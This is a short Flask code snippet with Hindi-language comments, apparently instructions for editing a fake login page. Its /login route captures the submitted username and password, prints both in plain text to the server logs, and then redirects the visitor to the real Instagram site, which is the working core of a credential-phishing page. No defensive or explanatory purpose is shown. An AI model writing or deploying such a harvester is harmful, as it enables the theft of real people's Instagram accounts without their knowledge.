import sys # Ye line sabse upar honi chahiye

# Login function ke andar ye badlav karein
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Ye line data ko "Zabardasti" logs mein dikhayegi
    print(f"--- NEW LOGIN: {username} | {password} ---", file=sys.stderr, flush=True)
    
    return redirect("https://www.instagram.com")
